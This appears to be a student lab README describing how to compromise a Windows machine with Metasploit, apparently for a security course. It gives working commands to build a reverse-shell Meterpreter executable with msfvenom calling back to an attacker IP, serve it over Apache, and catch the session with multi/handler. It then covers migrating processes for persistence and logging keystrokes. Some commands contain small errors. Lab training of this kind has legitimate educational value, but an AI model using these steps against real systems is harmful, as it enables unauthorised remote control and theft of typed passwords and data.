# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## PROGRAM:

Find the attackers ip address using ifconfig
## OUTPUT:

![240485931-d9b9e488-6580-4969-a3d2-5061443c0ed1](https://github.com/KRISHNARAJ-D/Compromising-windows-using-Metasploit/assets/119559695/e6f135d6-cf58-4b2f-8cab-868a55aba640)



Create a malicious executable file fun.exe using msenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
## OUTPUT:
![240482360-12b58fda-5cec-4e47-872b-b838ef920d46](https://github.com/KRISHNARAJ-D/Compromising-windows-using-Metasploit/assets/119559695/e7a1a40a-0f38-47b5-a179-e02887e73391)





copy the fun.exe into the apache /var/www/html folder

![240482762-37d7e507-5d47-4ddb-ba93-586f6d73a51b](https://github.com/KRISHNARAJ-D/Compromising-windows-using-Metasploit/assets/119559695/fa4f1c9d-4070-41dc-8c17-af3e7138514b)

Start apache server
sudo systemctl apache2 start
![240482920-0d0224f9-d80c-42b9-a3ab-09b48da66a27](https://github.com/KRISHNARAJ-D/Compromising-windows-using-Metasploit/assets/119559695/0d0b8f82-2e86-4b69-88c0-80eb34821aff)




Check the status of apache2
![240483068-77516604-9c4f-4317-a188-c41de4625542](https://github.com/KRISHNARAJ-D/Compromising-windows-using-Metasploit/assets/119559695/fda02337-8c5e-44a6-9785-3946ab6362ec)




Invoke msfconsole:
## OUTPUT:




Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.


Starting a command and control Server
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
exploit

![240483481-938f78c9-0e8a-42ef-847c-a7cee7393beb](https://github.com/KRISHNARAJ-D/Compromising-windows-using-Metasploit/assets/119559695/d32376c3-8d68-4a1a-bc28-bf3a31d940a3)



On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.168.1.2/fun.exe
The file "fun.exe" downloads. 


![240483850-4cf82361-ac00-46ab-92a2-3f09592d98d5](https://github.com/KRISHNARAJ-D/Compromising-windows-using-Metasploit/assets/119559695/4f2a5689-f926-44c2-a71f-68630800158d)

Bypass any warning boxes, double-click the file, and allow it to run.

On kali give the command exploit

![240484009-fee0700e-bafd-4e76-af72-f5ac23a5d6ba](https://github.com/KRISHNARAJ-D/Compromising-windows-using-Metasploit/assets/119559695/5cfa9933-aed6-47f4-ad7e-1c7cfe33282f)


To see a list of processes, at the meterpreter > prompt, execute this command:
ps  ⇒ can see the fun.exe process running with pid 1156

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.
To become more persistent, we'll migrate to a process that will last longer.
Let's migrate to the winlogon process.
At the meterpreter > prompt, execute this command:

migrate -N explorer.exe
at meterpreter > prompt, execute this command:
netstat
A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
Notice the "PID/Program name" value for this connection, which is redacted 

![240486096-b2d36ca1-64a2-4863-a648-4ef4a8727dd9](https://github.com/KRISHNARAJ-D/Compromising-windows-using-Metasploit/assets/119559695/965dcc7a-5996-4786-a545-831215ae3a00)


Post Exploitation
The target is now owned. Following are meterpreter commands for key capturing in the target machine
keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.


![240485311-85fb473c-59fe-4042-b163-552fddc735d1](https://github.com/KRISHNARAJ-D/Compromising-windows-using-Metasploit/assets/119559695/2470e8ab-b160-41d9-9325-9a20bff5e1b1)


keyscan_dump	Shows the keystrokes captured so far
![240485244-785ef849-9095-4065-b38a-54b544a0c440](https://github.com/KRISHNARAJ-D/Compromising-windows-using-Metasploit/assets/119559695/b4df833f-48cc-467c-937c-663c87f673d4)



## RESULT:
The Metasploit framework for reconnaissance is  examined successfully
